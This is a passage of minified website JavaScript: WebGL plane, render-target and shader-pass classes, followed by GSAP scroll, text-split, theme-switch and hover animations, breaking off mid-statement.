      setScale(t) {
        if (t.type && "Vec2" === t.type) {
          if (
            (t.sanitizeNaNValuesWith(this.scale).max(new G(0.001, 0.001)),
            t.x !== this.scale.x || t.y !== this.scale.y)
          ) {
            this.scale.set(t.x, t.y, 1);
            for (let t = 0; t < this.textures.length; t++)
              this.textures[t].resize();
            this._updateMVMatrix = !0;
          }
        } else
          this.renderer.production ||
            C(
              this.type +
                ": Cannot set scale because the parameter passed is not of Vec2 type:",
              t
            );
      }
      setRotation(t) {
        t.type && "Vec3" === t.type
          ? (t.sanitizeNaNValuesWith(this.rotation),
            t.equals(this.rotation) ||
              (this.rotation.copy(t),
              this.quaternion.setFromVec3(this.rotation),
              (this._updateMVMatrix = !0)))
          : this.renderer.production ||
            C(
              this.type +
                ": Cannot set rotation because the parameter passed is not of Vec3 type:",
              t
            );
      }
      setTransformOrigin(t) {
        t.type && "Vec3" === t.type
          ? (t.sanitizeNaNValuesWith(this.transformOrigin),
            t.equals(this.transformOrigin) ||
              (this.transformOrigin.copy(t), (this._updateMVMatrix = !0)))
          : this.renderer.production ||
            C(
              this.type +
                ": Cannot set transform origin because the parameter passed is not of Vec3 type:",
              t
            );
      }
      _setTranslation() {
        let t = new K();
        this.relativeTranslation.equals(t) ||
          (t = this._documentToWorldSpace(this.relativeTranslation)),
          this._translation.set(
            this._boundingRect.world.left + t.x,
            this._boundingRect.world.top + t.y,
            this._translation.z
          ),
          (this._updateMVMatrix = !0);
      }
      setRelativePosition(t) {
        this.renderer.production ||
          C(
            this.type +
              ": setRelativePosition() is deprecated, use setRelativeTranslation() instead"
          ),
          this.setRelativeTranslation(t);
      }
      setRelativeTranslation(t) {
        t.type && "Vec3" === t.type
          ? (t.sanitizeNaNValuesWith(this.relativeTranslation),
            t.equals(this.relativeTranslation) ||
              (this.relativeTranslation.copy(t), this._setTranslation()))
          : this.renderer.production ||
            C(
              this.type +
                ": Cannot set translation because the parameter passed is not of Vec3 type:",
              t
            );
      }
      _documentToWorldSpace(t) {
        return new K(
          (t.x /
            (this.renderer._boundingRect.width / this.renderer.pixelRatio)) *
            (this.renderer._boundingRect.width /
              this.renderer._boundingRect.height),
          -t.y /
            (this.renderer._boundingRect.height / this.renderer.pixelRatio),
          t.z
        );
      }
      _getIntersection(t, e) {
        let r = e.clone().sub(t),
          i = t.clone();
        for (; i.z > -1; ) i.add(r);
        return i;
      }
      _getNearPlaneIntersections(t, e, r) {
        if (1 === r.length)
          0 === r[0]
            ? ((e[0] = this._getIntersection(
                e[1],
                new K(0.95, 1, 0).applyMat4(this._matrices.mVPMatrix)
              )),
              e.push(
                this._getIntersection(
                  e[3],
                  new K(-1, -0.95, 0).applyMat4(this._matrices.mVPMatrix)
                )
              ))
            : 1 === r[0]
            ? ((e[1] = this._getIntersection(
                e[0],
                new K(-0.95, 1, 0).applyMat4(this._matrices.mVPMatrix)
              )),
              e.push(
                this._getIntersection(
                  e[2],
                  new K(1, -0.95, 0).applyMat4(this._matrices.mVPMatrix)
                )
              ))
            : 2 === r[0]
            ? ((e[2] = this._getIntersection(
                e[3],
                new K(-0.95, -1, 0).applyMat4(this._matrices.mVPMatrix)
              )),
              e.push(
                this._getIntersection(
                  e[1],
                  new K(1, 0.95, 0).applyMat4(this._matrices.mVPMatrix)
                )
              ))
            : 3 === r[0] &&
              ((e[3] = this._getIntersection(
                e[2],
                new K(0.95, -1, 0).applyMat4(this._matrices.mVPMatrix)
              )),
              e.push(
                this._getIntersection(
                  e[0],
                  new K(-1, 0.95, 0).applyMat4(this._matrices.mVPMatrix)
                )
              ));
        else if (2 === r.length)
          0 === r[0] && 1 === r[1]
            ? ((e[0] = this._getIntersection(
                e[3],
                new K(-1, -0.95, 0).applyMat4(this._matrices.mVPMatrix)
              )),
              (e[1] = this._getIntersection(
                e[2],
                new K(1, -0.95, 0).applyMat4(this._matrices.mVPMatrix)
              )))
            : 1 === r[0] && 2 === r[1]
            ? ((e[1] = this._getIntersection(
                e[0],
                new K(-0.95, 1, 0).applyMat4(this._matrices.mVPMatrix)
              )),
              (e[2] = this._getIntersection(
                e[3],
                new K(-0.95, -1, 0).applyMat4(this._matrices.mVPMatrix)
              )))
            : 2 === r[0] && 3 === r[1]
            ? ((e[2] = this._getIntersection(
                e[1],
                new K(1, 0.95, 0).applyMat4(this._matrices.mVPMatrix)
              )),
              (e[3] = this._getIntersection(
                e[0],
                new K(-1, 0.95, 0).applyMat4(this._matrices.mVPMatrix)
              )))
            : 0 === r[0] &&
              3 === r[1] &&
              ((e[0] = this._getIntersection(
                e[1],
                new K(0.95, 1, 0).applyMat4(this._matrices.mVPMatrix)
              )),
              (e[3] = this._getIntersection(
                e[2],
                new K(0.95, -1, 0).applyMat4(this._matrices.mVPMatrix)
              )));
        else if (3 === r.length) {
          let i = 0;
          for (let e = 0; e < t.length; e++) r.includes(e) || (i = e);
          (e = [e[i]]),
            0 === i
              ? (e.push(
                  this._getIntersection(
                    e[0],
                    new K(-0.95, 1, 0).applyMat4(this._matrices.mVPMatrix)
                  )
                ),
                e.push(
                  this._getIntersection(
                    e[0],
                    new K(-1, 0.95, 0).applyMat4(this._matrices.mVPMatrix)
                  )
                ))
              : 1 === i
              ? (e.push(
                  this._getIntersection(
                    e[0],
                    new K(0.95, 1, 0).applyMat4(this._matrices.mVPMatrix)
                  )
                ),
                e.push(
                  this._getIntersection(
                    e[0],
                    new K(1, 0.95, 0).applyMat4(this._matrices.mVPMatrix)
                  )
                ))
              : 2 === i
              ? (e.push(
                  this._getIntersection(
                    e[0],
                    new K(0.95, -1, 0).applyMat4(this._matrices.mVPMatrix)
                  )
                ),
                e.push(
                  this._getIntersection(
                    e[0],
                    new K(1, -0.95, 0).applyMat4(this._matrices.mVPMatrix)
                  )
                ))
              : 3 === i &&
                (e.push(
                  this._getIntersection(
                    e[0],
                    new K(-0.95, -1, 0).applyMat4(this._matrices.mVPMatrix)
                  )
                ),
                e.push(
                  this._getIntersection(
                    e[0],
                    new K(-1.95, 0).applyMat4(this._matrices.mVPMatrix)
                  )
                ));
        } else
          for (let r = 0; r < t.length; r++) (e[r][0] = 1e4), (e[r][1] = 1e4);
        return e;
      }
      _getWorldCoords() {
        const t = [
          new K(-1, 1, 0),
          new K(1, 1, 0),
          new K(1, -1, 0),
          new K(-1, -1, 0),
        ];
        let e = [],
          r = [];
        for (let i = 0; i < t.length; i++) {
          const n = t[i].applyMat4(this._matrices.mVPMatrix);
          e.push(n), Math.abs(n.z) > 1 && r.push(i);
        }
        r.length && (e = this._getNearPlaneIntersections(t, e, r));
        let i = 1 / 0,
          n = -1 / 0,
          s = 1 / 0,
          o = -1 / 0;
        for (let t = 0; t < e.length; t++) {
          const r = e[t];
          r.x < i && (i = r.x),
            r.x > n && (n = r.x),
            r.y < s && (s = r.y),
            r.y > o && (o = r.y);
        }
        return { top: o, right: n, bottom: s, left: i };
      }
      _computeWebGLBoundingRect() {
        const t = this._getWorldCoords();
        let e = {
          top: 1 - (t.top + 1) / 2,
          right: (t.right + 1) / 2,
          bottom: 1 - (t.bottom + 1) / 2,
          left: (t.left + 1) / 2,
        };
        (e.width = e.right - e.left),
          (e.height = e.bottom - e.top),
          (this._boundingRect.worldToDocument = {
            width: e.width * this.renderer._boundingRect.width,
            height: e.height * this.renderer._boundingRect.height,
            top:
              e.top * this.renderer._boundingRect.height +
              this.renderer._boundingRect.top,
            left:
              e.left * this.renderer._boundingRect.width +
              this.renderer._boundingRect.left,
            right:
              e.left * this.renderer._boundingRect.width +
              this.renderer._boundingRect.left +
              e.width * this.renderer._boundingRect.width,
            bottom:
              e.top * this.renderer._boundingRect.height +
              this.renderer._boundingRect.top +
              e.height * this.renderer._boundingRect.height,
          });
      }
      getWebGLBoundingRect() {
        return this._matrices.mVPMatrix
          ? ((this._boundingRect.worldToDocument && !this.alwaysDraw) ||
              this._computeWebGLBoundingRect(),
            this._boundingRect.worldToDocument)
          : this._boundingRect.document;
      }
      _getWebGLDrawRect() {
        return (
          this._computeWebGLBoundingRect(),
          {
            top:
              this._boundingRect.worldToDocument.top -
              this.drawCheckMargins.top,
            right:
              this._boundingRect.worldToDocument.right +
              this.drawCheckMargins.right,
            bottom:
              this._boundingRect.worldToDocument.bottom +
              this.drawCheckMargins.bottom,
            left:
              this._boundingRect.worldToDocument.left -
              this.drawCheckMargins.left,
          }
        );
      }
      _shouldDrawCheck() {
        const t = this._getWebGLDrawRect();
        Math.round(t.right) <= this.renderer._boundingRect.left ||
        Math.round(t.left) >=
          this.renderer._boundingRect.left +
            this.renderer._boundingRect.width ||
        Math.round(t.bottom) <= this.renderer._boundingRect.top ||
        Math.round(t.top) >=
          this.renderer._boundingRect.top + this.renderer._boundingRect.height
          ? this._shouldDraw &&
            ((this._shouldDraw = !1),
            this.renderer.nextRender.add(
              () => this._onLeaveViewCallback && this._onLeaveViewCallback()
            ))
          : (this._shouldDraw ||
              this.renderer.nextRender.add(
                () =>
                  this._onReEnterViewCallback && this._onReEnterViewCallback()
              ),
            (this._shouldDraw = !0));
      }
      isDrawn() {
        return (
          this._canDraw && this.visible && (this._shouldDraw || this.alwaysDraw)
        );
      }
      _applyWorldPositions() {
        this._setWorldSizes(), this._setTranslation();
      }
      updatePosition() {
        this._setDocumentSizes(), this._applyWorldPositions();
      }
      updateScrollPosition(t, e) {
        (t || e) &&
          ((this._boundingRect.document.top += e * this.renderer.pixelRatio),
          (this._boundingRect.document.left += t * this.renderer.pixelRatio),
          this._applyWorldPositions());
      }
      enableDepthTest(t) {
        this._depthTest = t;
      }
      moveToFront() {
        this.renderer.production ||
          C(
            this.type +
              ": moveToFront() is deprecated, please use setRenderOrder() instead"
          ),
          this.setRenderOrder();
      }
      _initSources() {
        let t = 0;
        if (this.autoloadSources) {
          const e = [];
          for (
            let t = 0;
            t < this.htmlElement.getElementsByTagName("img").length;
            t++
          )
            e.push(this.htmlElement.getElementsByTagName("img")[t]);
          e.length > 0 && this.loadImages(e);
          const r = [];
          for (
            let t = 0;
            t < this.htmlElement.getElementsByTagName("video").length;
            t++
          )
            r.push(this.htmlElement.getElementsByTagName("video")[t]);
          r.length > 0 && this.loadVideos(r);
          const i = [];
          for (
            let t = 0;
            t < this.htmlElement.getElementsByTagName("canvas").length;
            t++
          )
            i.push(this.htmlElement.getElementsByTagName("canvas")[t]);
          i.length > 0 && this.loadCanvases(i),
            (t = e.length + r.length + i.length);
        }
        this.loader._setLoaderSize(t), (this._canDraw = !0);
      }
      _startDrawing() {
        this._canDraw &&
          (this._onRenderCallback && this._onRenderCallback(),
          this.target
            ? this.renderer.bindFrameBuffer(this.target)
            : null === this.renderer.state.scenePassIndex &&
              this.renderer.bindFrameBuffer(null),
          this._setPerspectiveMatrix(),
          this._setMVMatrix(),
          (this.alwaysDraw || this._shouldDraw) &&
            this.visible &&
            this._draw());
      }
      onReEnterView(t) {
        return t && (this._onReEnterViewCallback = t), this;
      }
      onLeaveView(t) {
        return t && (this._onLeaveViewCallback = t), this;
      }
    }
    class rt {
      constructor(
        t,
        {
          shaderPass: e,
          depth: r = !1,
          clear: i = !0,
          minWidth: n = 1024,
          minHeight: s = 1024,
          texturesOptions: o = {},
        } = {}
      ) {
        (this.type = "RenderTarget"),
          (t = (t && t.renderer) || t) && "Renderer" === t.type
            ? t.gl || P(this.type + ": Renderer WebGL context is undefined", t)
            : P(this.type + ": Renderer not passed as first argument", t),
          (this.renderer = t),
          (this.gl = this.renderer.gl),
          (this.index = this.renderer.renderTargets.length),
          (this._shaderPass = e),
          (this._depth = r),
          (this._shouldClear = i),
          (this._minSize = {
            width: n * this.renderer.pixelRatio,
            height: s * this.renderer.pixelRatio,
          }),
          (o = Object.assign(
            {
              sampler: "uRenderTexture",
              isFBOTexture: !0,
              premultiplyAlpha: !1,
              anisotropy: 1,
              generateMipmap: !1,
              floatingPoint: "none",
              wrapS: this.gl.CLAMP_TO_EDGE,
              wrapT: this.gl.CLAMP_TO_EDGE,
              minFilter: this.gl.LINEAR,
              magFilter: this.gl.LINEAR,
            },
            o
          )),
          (this._texturesOptions = o),
          (this.userData = {}),
          (this.uuid = F()),
          this.renderer.renderTargets.push(this),
          this.renderer.onSceneChange(),
          this._initRenderTarget();
      }
      _initRenderTarget() {
        this._setSize(), (this.textures = []), this._createFrameBuffer();
      }
      _restoreContext() {
        this._setSize(), this._createFrameBuffer();
      }
      _setSize() {
        this._shaderPass && this._shaderPass._isScenePass
          ? (this._size = {
              width: this.renderer._boundingRect.width,
              height: this.renderer._boundingRect.height,
            })
          : (this._size = {
              width: Math.max(
                this._minSize.width,
                this.renderer._boundingRect.width
              ),
              height: Math.max(
                this._minSize.height,
                this.renderer._boundingRect.height
              ),
            });
      }
      resize() {
        this._shaderPass &&
          (this._setSize(),
          this.textures[0].resize(),
          this.renderer.bindFrameBuffer(this, !0),
          this._depth && this._bindDepthBuffer(),
          this.renderer.bindFrameBuffer(null));
      }
      _bindDepthBuffer() {
        this._depthBuffer &&
          (this.gl.bindRenderbuffer(this.gl.RENDERBUFFER, this._depthBuffer),
          this.gl.renderbufferStorage(
            this.gl.RENDERBUFFER,
            this.gl.DEPTH_COMPONENT16,
            this._size.width,
            this._size.height
          ),
          this.gl.framebufferRenderbuffer(
            this.gl.FRAMEBUFFER,
            this.gl.DEPTH_ATTACHMENT,
            this.gl.RENDERBUFFER,
            this._depthBuffer
          ));
      }
      _createFrameBuffer() {
        (this._frameBuffer = this.gl.createFramebuffer()),
          this.renderer.bindFrameBuffer(this, !0),
          this.textures.length
            ? ((this.textures[0]._parent = this),
              this.textures[0]._restoreContext())
            : new Q(this.renderer, this._texturesOptions).addParent(this),
          this.gl.framebufferTexture2D(
            this.gl.FRAMEBUFFER,
            this.gl.COLOR_ATTACHMENT0,
            this.gl.TEXTURE_2D,
            this.textures[0]._sampler.texture,
            0
          ),
          this._depth &&
            ((this._depthBuffer = this.gl.createRenderbuffer()),
            this._bindDepthBuffer()),
          this.renderer.bindFrameBuffer(null);
      }
      getTexture() {
        return this.textures[0];
      }
      remove() {
        this._shaderPass
          ? this.renderer.production ||
            C(
              this.type +
                ": You're trying to remove a RenderTarget attached to a ShaderPass. You should remove that ShaderPass instead:",
              this._shaderPass
            )
          : (this._dispose(), this.renderer.removeRenderTarget(this));
      }
      _dispose() {
        this._frameBuffer &&
          (this.gl.deleteFramebuffer(this._frameBuffer),
          (this._frameBuffer = null)),
          this._depthBuffer &&
            (this.gl.deleteRenderbuffer(this._depthBuffer),
            (this._depthBuffer = null)),
          this.textures[0]._dispose(),
          (this.textures = []);
      }
    }
    class it extends $ {
      constructor(
        t,
        {
          shareProgram: e,
          widthSegments: r,
          heightSegments: i,
          renderOrder: n,
          depthTest: s,
          cullFace: o,
          uniforms: a,
          vertexShaderID: l,
          fragmentShaderID: h,
          vertexShader: u,
          fragmentShader: c,
          texturesOptions: d,
          crossOrigin: p,
          depth: f = !1,
          clear: g = !0,
          renderTarget: m,
        } = {}
      ) {
        super(t, t.container, "ShaderPass", {
          shareProgram: !1,
          widthSegments: 1,
          heightSegments: 1,
          renderOrder: n,
          depthTest: s,
          cullFace: "back",
          uniforms: a,
          vertexShaderID: l,
          fragmentShaderID: h,
          vertexShader: u,
          fragmentShader: c,
          texturesOptions: d,
          crossOrigin: p,
        }),
          (this._isScenePass = !0),
          (this.index = this.renderer.shaderPasses.length),
          (this.renderOrder = 0),
          (this._depth = f),
          (this._shouldClear = g),
          (this.target = m),
          this.target &&
            ((this._isScenePass = !1),
            (this._shouldClear = this.target._shouldClear)),
          this._program.compiled &&
            (this._initShaderPass(),
            this.renderer.shaderPasses.push(this),
            this.renderer.nextRender.add(() => {
              this.renderer.scene.addShaderPass(this);
            }));
      }
      _programRestored() {
        this._isScenePass
          ? this.renderer.scene.stacks.scenePasses.push(this.index)
          : this.renderer.scene.stacks.renderPasses.push(this.index);
        for (let t = 0; t < this.textures.length; t++)
          (this.textures[t]._parent = this), this.textures[t]._restoreContext();
        this._canDraw = !0;
      }
      _initShaderPass() {
        this.target
          ? (this.setRenderTarget(this.target),
            (this.target._shaderPass = this))
          : this._createFrameBuffer(),
          new Q(this.renderer, {
            sampler: "uRenderTexture",
            isFBOTexture: !0,
            fromTexture: this.target.getTexture(),
          }).addParent(this),
          this.loader._setLoaderSize(0),
          (this._canDraw = !0),
          this.renderer.needRender();
      }
      _createFrameBuffer() {
        const t = new rt(this.renderer, {
          shaderPass: this,
          clear: this._shouldClear,
          depth: this._depth,
          texturesOptions: this._texturesOptions,
        });
        this.setRenderTarget(t);
      }
      _startDrawing() {
        this._canDraw &&
          (this._onRenderCallback && this._onRenderCallback(),
          this._isScenePass
            ? this.renderer.state.scenePassIndex + 1 <
              this.renderer.scene.stacks.scenePasses.length
              ? (this.renderer.bindFrameBuffer(
                  this.renderer.scene.stacks.scenePasses[
                    this.renderer.state.scenePassIndex + 1
                  ].target
                ),
                this.renderer.state.scenePassIndex++)
              : this.renderer.bindFrameBuffer(null)
            : null === this.renderer.state.scenePassIndex &&
              this.renderer.bindFrameBuffer(null),
          (this.renderer.state.forceBufferUpdate = !0),
          this._draw());
      }
    }
    var nt,
      st,
      ot = r(12),
      at = r(14),
      lt = r(26);
    function ht(t) {
      return (ht =
        "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
          ? function (t) {
              return typeof t;
            }
          : function (t) {
              return t &&
                "function" == typeof Symbol &&
                t.constructor === Symbol &&
                t !== Symbol.prototype
                ? "symbol"
                : typeof t;
            })(t);
    }
    function ct(t, e) {
      for (var r = 0; r < e.length; r++) {
        var i = e[r];
        (i.enumerable = i.enumerable || !1),
          (i.configurable = !0),
          "value" in i && (i.writable = !0),
          Object.defineProperty(t, i.key, i);
      }
    }
    function dt(t, e) {
      return (dt =
        Object.setPrototypeOf ||
        function (t, e) {
          return (t.__proto__ = e), t;
        })(t, e);
    }
    function pt(t) {
      var e = (function () {
        if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
        if (Reflect.construct.sham) return !1;
        if ("function" == typeof Proxy) return !0;
        try {
          return (
            Date.prototype.toString.call(
              Reflect.construct(Date, [], function () {})
            ),
            !0
          );
        } catch (t) {
          return !1;
        }
      })();
      return function () {
        var r,
          i = gt(t);
        if (e) {
          var n = gt(this).constructor;
          r = Reflect.construct(i, arguments, n);
        } else r = i.apply(this, arguments);
        return (function ft(t, e) {
          return !e || ("object" !== ht(e) && "function" != typeof e)
            ? (function (t) {
                if (void 0 === t)
                  throw new ReferenceError(
                    "this hasn't been initialised - super() hasn't been called"
                  );
                return t;
              })(t)
            : e;
        })(this, r);
      };
    }
    function gt(t) {
      return (gt = Object.setPrototypeOf
        ? Object.getPrototypeOf
        : function (t) {
            return t.__proto__ || Object.getPrototypeOf(t);
          })(t);
    }
    r(77),
      f.gsap.registerPlugin(g.ExpoScaleEase),
      f.gsap.registerPlugin(
        ot.SplitText,
        g.ExpoScaleEase,
        at.ScrollTrigger,
        lt.DrawSVGPlugin
      );
    var mt,
      Dt,
      xt,
      bt,
      _t = document.body,
      vt =
        (document.querySelector("main"), document.querySelector(".js-header")),
      yt = (function (t) {
        !(function (t, e) {
          if ("function" != typeof e && null !== e)
            throw new TypeError(
              "Super expression must either be null or a function"
            );
          (t.prototype = Object.create(e && e.prototype, {
            constructor: { value: t, writable: !0, configurable: !0 },
          })),
            e && dt(t, e);
        })(s, t);
        var e,
          r,
          n = pt(s);
        function s() {
          return (
            (function ut(t, e) {
              if (!(t instanceof e))
                throw new TypeError("Cannot call a class as a function");
            })(this, s),
            n.apply(this, arguments)
          );
        }
        return (
          (e = s),
          (r = [
            {
              key: "onEnter",
              value: function () {
                _t.classList.remove("is-transition");
              },
            },
            {
              key: "onEnterCompleted",
              value: function () {
                var t = document.querySelector(".js-footer"),
                  e =
                    (document.querySelector(".js-project-info"),
                    document.querySelector(".js-tb"),
                    document.querySelector(".js-mask"));
                (st = {
                  el: document.querySelector("[data-scroll-container]"),
                  smooth: !0,
                  getSpeed: !0,
                  getDirection: !0,
                  useKeyboard: !0,
                  inertia: 0.75,
                  multiplier: 1.2,
                  direction: "vertical",
                }),
                  "true" ==
                    document
                      .querySelector("[data-scroll-container]")
                      .getAttribute("data-horizontal") &&
                    (st.direction = "horizontal"),
                  setTimeout(function () {
                    nt = new S.a(st);
                    var r,
                      i,
                      n,
                      s,
                      o,
                      a,
                      l,
                      h = document.querySelector(".js-scroll-top");
                    h &&
                      h.addEventListener("click", function () {
                        nt.scrollTo(0);
                      }),
                      new ot.SplitText(".js-split", {
                        type: "lines",
                        linesClass: "line line++",
                      }).lines.forEach(function (t) {
                        t.outerHTML = "<div>" + t.outerHTML + "</div>";
                      }),
                      new ot.SplitText(".js-split div > div", {
                        type: "lines",
                        linesClass: "line line++",
                      }),
                      (function () {
                        var t = document.querySelectorAll(".js-client-item"),
                          e = document.querySelector(".js-clients");
                        if (e) {
                          var r,
                            n = 0,
                            s = 0,
                            o = 0,
                            a = 0,
                            l = document.createElement("div");
                          (l.className = "o-client | js-client"),
                            (l.innerHTML = "<img src=''>"),
                            document.body.appendChild(l);
                          var h = l.querySelector("img");
                          e.addEventListener("mouseenter", function () {
                            f.gsap.fromTo(
                              l,
                              0.5,
                              { opacity: 0 },
                              { opacity: 1, ease: "expo.inOut" }
                            );
                          }),
                            e.addEventListener("mouseleave", function () {
                              f.gsap.fromTo(
                                l,
                                0.5,
                                { opacity: 1 },
                                { opacity: 0, ease: "expo.inOut" }
                              );
                            }),
                            window.addEventListener("mousemove", function (t) {
                              (n = t.clientX), (s = t.clientY);
                            }),
                            t.forEach(function (t) {
                              t.addEventListener("mouseenter", function () {
                                (r = t),
                                  (h.src = r.dataset.img),
                                  f.gsap.fromTo(
                                    h,
                                    1.75,
                                    { scale: 1.5 },
                                    { scale: 1, ease: "expo.out" }
                                  );
                              }),
                                t.addEventListener("click", function (t) {
                                  l.style.display = "none";
                                });
                            }),
                            (function t() {
                              (o += 0.05 * (n - o)),
                                (a += 0.05 * (s - a)),
                                (l.style.transform = "translate3d("
                                  .concat(o, "px, ")
                                  .concat(a, "px, 0)")),
                                requestAnimationFrame(t);
                            })();
                        } else {
                          var u = document.querySelector(".js-client");
                          u && u.remove();
                        }
                      })(),
                      (r = document.documentElement),
                      (i = document.querySelector(".js-switch")),
                      (n = getComputedStyle(
                        document.documentElement
                      ).getPropertyValue("--bg-color")),
                      (s = getComputedStyle(
                        document.documentElement
                      ).getPropertyValue("--fg-color")),
                      (o = getComputedStyle(
                        document.documentElement
                      ).getPropertyValue("--bg-color-rgb")),
                      (a = getComputedStyle(
                        document.documentElement
                      ).getPropertyValue("--fg-color-rgb")),
                      (l = !1),
                      f.gsap.set(i.querySelector("svg path"), {
                        transformOrigin: "center left",
                      }),
                      i.addEventListener("click", function () {
                        l
                          ? (r.style.setProperty("--bg-color", n),
                            r.style.setProperty("--fg-color", s),
                            r.style.setProperty("--fg-color-rgb", a),
                            f.gsap.fromTo(
                              i.querySelector("svg path"),
                              1,
                              { rotation: 180 },
                              { rotation: 0, ease: "expo.out" }
                            ),
                            (l = !1),
                            document
                              .querySelector("body")
                              .classList.remove("is-switched"))
                          : (r.style.setProperty("--bg-color", s),
                            r.style.setProperty("--fg-color", n),
                            r.style.setProperty("--fg-color-rgb", o),
                            f.gsap.fromTo(
                              i.querySelector("svg path"),
                              1,
                              { rotation: 0 },
                              { rotation: 180, ease: "expo.out" }
                            ),
                            (l = !0),
                            document
                              .querySelector("body")
                              .classList.add("is-switched"));
                      }),
                      document
                        .querySelectorAll(".js-about-link")
                        .forEach(function (t) {
                          var e = t.querySelector("div"),
                            r = f.gsap.timeline();
                          t.addEventListener("mouseover", function () {
                            r.fromTo(
                              e,
                              0.625,
                              { xPercent: 0 },
                              { xPercent: -100, ease: "expo.inOut" },
                              "0"
                            ),
                              r.fromTo(
                                e,
                                0.625,
                                { xPercent: 100 },
                                {
                                  xPercent: 0,
                                  ease: "expo.inOut",
                                  onComplete: function () {
                                    r.clear();
                                  },
                                },
                                "+=0"
                              );
                          });
                        }),
                      (mt = new ot.SplitText(".js-chars", {
                        type: "words,chars",
                        charsClass: "char",
                      })),
                      document
                        .querySelectorAll(".js-text-hover")
                        .forEach(function (t) {
                          var e = f.gsap.utils.toArray(t),
                            r = f.gsap.timeline({ paused: !0 }),
                            i = e[0]
                              .querySelectorAll(".js-chars")[0]
                              .querySelectorAll(".char");
                          r.to(
                            i,
                            1.33,
                            {
                              opacity: 0,
                              yPercent: -50,
                              rotationX: 45,
                              ease: "expo.inOut",
                              stagger: 0.04,
                            },
                            "0"
                          );
                          var n = e[0]
                            .querySelectorAll(".js-chars")[1]
                            .querySelectorAll(".char");
                          r.fromTo(
                            n,
                            1.33,
                            { opacity: 0, yPercent: 0, rotationX: 45 },
                            {
                              opacity: 1,
                              yPercent: -100,
                              rotationX: 0,
                              ease: "expo.inOut",
                              stagger: 0.04,
                            },
                            "0"
                          ),
                            t.addEventListener("mouseover", function () {
                              r.play();
                            }),
                            t.addEventListener("mouseleave", function () {
                              r.reverse();
                            });
                        });
                    var u = document.querySelectorAll(".js-about-title");
                    if (
                      (u.length > 0 &&
                        f.gsap.from(u, 2, { opacity: 0, ease: "expo.inOut" }),
                      document.querySelector(
                        ".js-main__wrap[data-template='project']"
                      )
                        ? (document.querySelector(
                            ".js-progress"
                          ).style.opacity = 1)
                        : (document.querySelector(
                            ".js-progress"
                          ).style.opacity = 0),
                      nt.on("scroll", function (t) {
                        if (
                          (("down" == t.direction && t.speed > 4) ||
                          ("up" == t.direction && t.speed < -4)
                            ? (e.style.pointerEvents = "all")
                            : (e.style.pointerEvents = "none"),
                          document.querySelector(
                            ".js-main__wrap[data-template='project']"
                          ))
                        ) {
                          var r = document.querySelector(".js-progress"),
                            i = document.querySelector(".js-tb-icon svg"),
                            n = 1e3 * t.limit.x,
                            s = ((1e3 * t.scroll.x) / n) * 100;
                          (r.style.transform = "translateX(".concat(s, "%)")),
                            (i.style.transform = "rotate(".concat(
                              7.5 * s,
                              "deg)"
                            ));
                        } else {
                          var o = document.querySelector(
                              ".js-header__logo svg"
                            ),
                            a = 1e3 * t.limit.y,
                            l = ((1e3 * t.scroll.y) / a) * 100;
                          o.style.transform = "rotate(".concat(5 * l, "deg)");
                        }
                      }),
                      nt.on("scroll", at.ScrollTrigger.update),
                      at.ScrollTrigger.scrollerProxy(
                        "[data-scroll-container]",
                        {
                          scrollTop: function (t) {
                            return "vertical" == st.direction
                              ? arguments.length
                                ? nt.scrollTo(t, 0, 0)
                                : nt.scroll.instance.scroll.y
                              : "horizontal" == st.direction
                              ? arguments.length
                                ? nt.scrollTo(t, 0, 0)
                                : nt.scroll.instance.scroll.x
                              : void 0;
                          },
                          scrollLeft: function (t) {
                            return arguments.length
                              ? nt.scrollTo(t, 0, 0)
                              : nt.scroll.instance.scroll.x;
                          },
                          getBoundingClientRect: function () {
                            return {
                              top: 0,
                              left: 0,
                              width: window.innerWidth,
                              height: window.innerHeight,
                            };
                          },
                          pinType: document.querySelector(
                            "[data-scroll-section]"
                          ).style.transform
                            ? "transform"
                            : "fixed",
                        }
                      ),
                      t)
                    ) {
                      var c = document.querySelectorAll(
                        ".js-footer-inner span"
                      );
                      f.gsap.from(c, 2, {
                        yPercent: 100,
                        opacity: 0,
                        ease: "expo.out",
                        stagger: { from: "center", amount: 0.15 },
                        scrollTrigger: {
                          trigger: ".js-footer-inner",
                          scroller: "[data-scroll-container]",
                        },
                      });
                    }
                    var d = document.querySelectorAll(
                      ".js-heading__title span"
                    );
                    d.length > 0 &&
                      f.gsap.from(d, {
                        scrollTrigger: {
                          trigger: d,
                          scroller: "[data-scroll-container]",
                          endTrigger: d,
                        },
                        opacity: 0,
                        yPercent: 100,
                        duration: 2,
                        ease: "expo.inOut",
                      });
                    var p = document.querySelectorAll(".js-border");
                    p.length > 0 &&
                      p.forEach(function (t) {
                        f.gsap.from(t.querySelector("div"), {
                          scrollTrigger: {
                            start: "bottom bottom",
                            trigger: t,
                            scroller: "[data-scroll-container]",
                            endTrigger: t,
                          },
                          width: 0,
                          opacity: 0.5,
                          x: -t.offsetWidth,
                          duration: 3,
                          ease: "expo.inOut",
                        });
                      });
                    var g = document.querySelectorAll(".js-text");
                    g.length > 0 &&
                      g.forEach(function (t) {
                        f.gsap.from(t.querySelectorAll("div > div"), {
                          scrollTrigger: {
                            start: "top bottom",
                            trigger: t,
                            scroller: "[data-scroll-container]",
                            endTrigger: t,
                          },
                          yPercent: 100,
                          opacity: 0,
                          duration: 2,
                          ease: "expo.out",
                          stagger: 0.0625,
                        });
                      });
                    var m = document.querySelectorAll(".js-project-text");
                    m.length > 0 &&
                      m.forEach(function (t) {
                        f.gsap.from(
                          t.querySelectorAll("div > div"),
                          {
                            scrollTrigger: {
                              start: "top bottom",
                              trigger: t,
                              scroller: "[data-scroll-container]",
                              endTrigger: t,
                            },
                            yPercent: 100,
                            opacity: 0,
                            duration: 1.25,
                            ease: "expo.inOut",
                            stagger: 0.05,
                          },
                          "1.25"
                        );
                      });
                    var _ = document.querySelectorAll(".js-plane");
                    _.length > 0 &&
                      window.innerWidth < 1024 &&
                      _.forEach(function (t) {
                        t.classList.contains("c-twocol__img") ||
                          (f.gsap.from(t, {
                            scrollTrigger: { start: "top bottom", trigger: t },
                            xPercent: -100,
                            duration: 1.25,
                            ease: "expo.inOut",
                          }),
                          f.gsap.from(t.querySelector("img"), {
                            scrollTrigger: { start: "top bottom", trigger: t },
                            xPercent: 100,
                            opacity: 0.33,
                            duration: 1.25,
                            ease: "expo.inOut",
                          }));
                      });
                    var v = document.querySelectorAll(".js-btn");
                    v.length > 0 &&
                      (v.forEach(function (t) {
                        f.gsap.set(t.querySelector("path"), {
                          opacity: 0,
                          xPercent: -80,
                        }),
